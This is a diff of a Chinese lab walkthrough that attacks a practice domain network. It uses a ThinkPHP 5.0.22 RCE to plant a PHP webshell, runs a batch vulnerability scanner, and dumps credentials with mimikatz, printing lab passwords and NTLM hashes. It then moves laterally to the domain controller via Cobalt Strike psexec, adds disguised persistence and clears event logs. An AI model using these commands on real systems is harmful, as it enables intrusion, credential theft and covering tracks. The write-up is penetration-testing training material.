@@ -55,7 +55,7 @@ win7  外网 IP： 192.168.135.150
 
 
 
-# <font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">信息搜集</font>
+# 信息搜集
 
 
 ## 扫描端口：
@@ -114,17 +114,17 @@ Nmap done: 1 IP address (1 host up) scanned in 6.22 seconds
 
 确定 thinkphp 具体版本：
 
-> <font style="color:rgb(35, 57, 77);">为了确定具体版本，这里先使用报错查看，发现这里的版本为5.0.22，如果没记错的话这里是有一个tp远程命令执行漏洞的</font>
+> 为了确定具体版本，这里先使用报错查看，发现这里的版本为5.0.22，如果没记错的话这里是有一个tp远程命令执行漏洞的
 >
-> <font style="color:rgb(35, 57, 77);background-color:rgb(246, 246, 246);">漏洞描述：由于thinkphp对框架中的核心Requests类的method方法提供了表单请求伪造，该功能利用</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(238, 238, 238);">$_POST['_method']</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(246, 246, 246);">来传递真实的请求方法。但由于框架没有对参数进行验证，导致攻击者可以设置</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(238, 238, 238);">$_POST['_method']='__construct'</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(246, 246, 246);">而让该类的变量被覆盖。攻击者利用该方式将filter变量覆盖为system等函数名，当内部进行参数过滤时便会进行执行任意命令。</font>
+> 漏洞描述：由于thinkphp对框架中的核心Requests类的method方法提供了表单请求伪造，该功能利用`$_POST['_method']`来传递真实的请求方法。但由于框架没有对参数进行验证，导致攻击者可以设置`$_POST['_method']='__construct'`而让该类的变量被覆盖。攻击者利用该方式将filter变量覆盖为system等函数名，当内部进行参数过滤时便会进行执行任意命令。
 >
 
 <!-- 这是一张图片，ocr 内容为： -->
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457296.png)
 
-版本为：[<font style="color:rgb(134, 134, 134);">ThinkPHP</font>](http://www.thinkphp.cn/)<font style="color:rgb(51, 51, 51);"> V5.0.22 </font>
+版本为：[ThinkPHP](http://www.thinkphp.cn/) V5.0.22 
 
-<font style="color:rgb(51, 51, 51);"></font>
+
 
 kali 中搜索：有一个 5.X 的 RCE
 
@@ -147,7 +147,7 @@ thinkphp 5.0.22
 
 ```
 
-<font style="color:rgb(51, 51, 51);"></font>
+
 
 <!-- 这是一张图片，ocr 内容为： -->
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459664.png)
@@ -163,7 +163,7 @@ thinkphp 5.0.22
 
 
 
-<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">看一下进程，发现无杀软那么不用免杀直接写webshell</font>
+看一下进程，发现无杀软那么不用免杀直接写webshell
 
 ```bash
 ?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=tasklist /svc
@@ -178,7 +178,7 @@ thinkphp 5.0.22
 
 
 
-<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">echo写一句话木马进去，因为之前查看过没有杀软，这里就不需要做免杀处理</font>
+echo写一句话木马进去，因为之前查看过没有杀软，这里就不需要做免杀处理
 
 ```bash
 ?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo "<?php @eval($_POST[cmd]);?>" > shell.php
@@ -211,12 +211,12 @@ thinkphp 5.0.22
 
 
 
-#### <font style="color:rgb(35, 57, 77);">thinkphp批量检测</font>
+#### thinkphp批量检测
 **出自：**[**https://drunkmars.top/2021/07/06/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/**](https://drunkmars.top/2021/07/06/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA5/)
 
-> <font style="color:rgb(35, 57, 77);">这里我思考了一个问题，thinkphp的版本这么多，如果kali里面的漏洞库没有，而在搜索引擎上去搜索又太耗费时间，有没有一个批量检测thinkphp漏洞的脚本呢？</font>
+> 这里我思考了一个问题，thinkphp的版本这么多，如果kali里面的漏洞库没有，而在搜索引擎上去搜索又太耗费时间，有没有一个批量检测thinkphp漏洞的脚本呢？
 >
-> <font style="color:rgb(35, 57, 77);">这里我找到了一个thinkphp漏洞批量检测的脚本</font>
+> 这里我找到了一个thinkphp漏洞批量检测的脚本
 >
 
 ```python
@@ -303,20 +303,20 @@ if __name__=="__main__":
         i.join()
 ```
 
-> <font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">这里的使用方法很简单：将要检测的目标放在url.txt里面，如果存在漏洞的地址将自动生成一个target.txt文本保存</font>
+> 这里的使用方法很简单：将要检测的目标放在url.txt里面，如果存在漏洞的地址将自动生成一个target.txt文本保存
 >
 
 <!-- 这是一张图片，ocr 内容为： -->
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459517.png)
 
-<font style="color:rgb(35, 57, 77);"></font>
 
-<font style="color:rgb(35, 57, 77);"></font>
 
-<font style="color:rgb(35, 57, 77);"></font>
 
-# <font style="color:rgb(35, 57, 77);">漏洞利用</font>
-## <font style="color:rgb(35, 57, 77);">蚁剑信息收集</font>
+
+
+
+# 漏洞利用
+## 蚁剑信息收集
 
 
 通过之前的 thinkphp 5.0 的 RCE 漏洞，上传了 shell.php，并且蚁剑连接成功，接下来对内网的信息进行收集：
@@ -332,9 +332,9 @@ if __name__=="__main__":
 
 
 
-<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">查看一下域信息：”</font>
+查看一下域信息：”
 
-<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);"></font>
+
 
 <!-- 这是一张图片，ocr 内容为： -->
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459860.png)
@@ -374,9 +374,9 @@ kali 生成一个后门：
 
 
 
-<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">msf 开启监听</font>
+msf 开启监听
 
-<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">上线成功：</font>
+上线成功：
 
 ```bash
 msf > use exploit/multi/handler 
@@ -414,7 +414,7 @@ meterpreter >
 
 
 
-<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">对域进行信息搜集</font>
+对域进行信息搜集
 
 ```bash
 meterpreter > shell 
@@ -486,7 +486,7 @@ C:\Windows\system32>
 
 ```
 
-<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">只有一个域控，这里直接ping一下域控得到域控 ip 为 192.168.138.138</font>
+只有一个域控，这里直接ping一下域控得到域控 ip 为 192.168.138.138
 
 ```bash
 C:\Windows\system32>ping DC.sun.com
@@ -509,7 +509,7 @@ C:\Windows\system32>
 
 
 
-#### <font style="color:rgb(35, 57, 77);">获取凭证</font>
+#### 获取凭证
 ```bash
 C:\Windows\system32>^C
 Terminate channel 1? [y/N]  y
@@ -551,9 +551,9 @@ meterpreter >
 
 ```
 
-<font style="color:rgb(35, 57, 77);"></font>
 
-<font style="color:rgb(35, 57, 77);"></font>
+
+
 
 ```bash
 load kiwi  # 加载 kiwi 模块
@@ -565,7 +565,7 @@ kiwi_cmd sekurlsa::logonPasswords  # 通过读取 lsass.exe（本地安全授权
 
 ```
 
-<font style="color:rgb(35, 57, 77);"></font>
+
 
 ```bash
 meterpreter > 
@@ -828,33 +828,33 @@ meterpreter >
 
 ```
 
-<font style="color:rgb(35, 57, 77);"></font>
 
-<font style="color:rgb(35, 57, 77);"></font>
+
+
 
 <!-- 这是一张图片，ocr 内容为： -->
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456562.png)
 
-<font style="color:rgb(35, 57, 77);"></font>
+
 
 <!-- 这是一张图片，ocr 内容为： -->
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457843.png)
 
-<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);"></font>
 
-+ **域管理员 (Administrator)**<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">：</font>
-    - **明文密码**<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">：</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">dc123.com</font>`
-    - **NTLM 哈希**<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">：</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">e8bea972b3549868cecd667a64a6ac46</font>`
-    - **所属域**<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">：</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">SUN.COM</font>`
-+ **普通用户 (leo)**<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">：</font>
-    - **明文密码**<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">：</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">123.com</font>`
-    - **NTLM 哈希**<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">：</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">afffeba176210fad4628f0524bfe1942</font>`
 
-<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);"></font>
++ **域管理员 (Administrator)**：
+    - **明文密码**：`dc123.com`
+    - **NTLM 哈希**：`e8bea972b3549868cecd667a64a6ac46`
+    - **所属域**：`SUN.COM`
++ **普通用户 (leo)**：
+    - **明文密码**：`123.com`
+    - **NTLM 哈希**：`afffeba176210fad4628f0524bfe1942`
 
-<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);"></font>
 
-<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);"></font>
+
+
+
+
 
 ## 上线 CS
 除了用蚁剑连接上线 msf，还可以用 CS：
@@ -953,7 +953,7 @@ meterpreter >
 
 
 ### 内网信息收集
-#### <font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">扫描内网网段</font>
+#### 扫描内网网段
 ` portscan 192.168.138.0/24  `
 
 <!-- 这是一张图片，ocr 内容为： -->
@@ -963,58 +963,58 @@ meterpreter >
 
 
 
-<font style="color:rgb(35, 57, 77);"></font>
 
-# <font style="color:rgb(35, 57, 77);">内网横向移动</font>
-## <font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">psexec64连接域控</font>
+
+# 内网横向移动
+## psexec64连接域控
   
  首先要有域管理员的凭据：
 
-+ **域管理员 (Administrator)**<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">：</font>
-    - **明文密码**<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">：</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">dc123.com</font>`
-    - **NTLM 哈希**<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">：</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">e8bea972b3549868cecd667a64a6ac46</font>`
-    - **所属域**<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">：</font>`<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">SUN.COM</font>`
++ **域管理员 (Administrator)**：
+    - **明文密码**：`dc123.com`
+    - **NTLM 哈希**：`e8bea972b3549868cecd667a64a6ac46`
+    - **所属域**：`SUN.COM`
 
-<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);"></font>
 
-<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);"> 配置监听器</font>
 
-<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);"> 由于域控通常在内网深处，无法直接连接 Kali 外网 IP，创建一个 </font>**SMB Beacon**<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);"> 监听器  </font>
+ 配置监听器
+
+ 由于域控通常在内网深处，无法直接连接 Kali 外网 IP，创建一个 **SMB Beacon** 监听器  
 
 <!-- 这是一张图片，ocr 内容为： -->
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500818.png)
 
-<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);"></font>
 
-<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">接下来在 </font>**<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">视图->目标列表</font>**
+
+接下来在 **视图->目标列表**
 
 就可以看到域控了：
 
 <!-- 这是一张图片，ocr 内容为： -->
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081458517.png)
 
-**<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">右键->横向移动->psexec64</font>**
+**右键->横向移动->psexec64**
 
 <!-- 这是一张图片，ocr 内容为： -->
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081459876.png)
 
-<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);"></font>
 
-<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">填入账号密码，选择监听器</font>
+
+填入账号密码，选择监听器
 
 <!-- 这是一张图片，ocr 内容为： -->
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456116.png)
 
-<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);"></font>
 
-<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">选择会话</font>
+
+选择会话
 
 <!-- 这是一张图片，ocr 内容为： -->
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081456646.png)
 
-<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);"></font>
 
-<font style="color:rgb(35, 57, 77);background-color:rgb(253, 253, 253);">成功控制域控机器</font>
+
+成功控制域控机器
 
 <!-- 这是一张图片，ocr 内容为： -->
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081500749.png)
@@ -1142,8 +1142,8 @@ shell sc start "WinDefendUpdater"
 shell reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /t REG_SZ /d "C:\Windows\Temp\beacon.exe" /f
 ```
 
-# <font style="color:rgb(35, 57, 77);">日志清除</font>
-<font style="color:rgb(35, 57, 77);">日志清除有两种方法，一种是使用kali里面自带的命令进行日志清除</font>
+# 日志清除
+日志清除有两种方法，一种是使用kali里面自带的命令进行日志清除
 
 ```plain
 run event_manager -i
@@ -1155,7 +1155,7 @@ run event_manager -c
 
 
 
-<font style="color:rgb(35, 57, 77);">第二种方法则是进入服务器管理器自行清除</font>
+第二种方法则是进入服务器管理器自行清除
 
 <!-- 这是一张图片，ocr 内容为： -->
 ![](https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202604081457591.png)
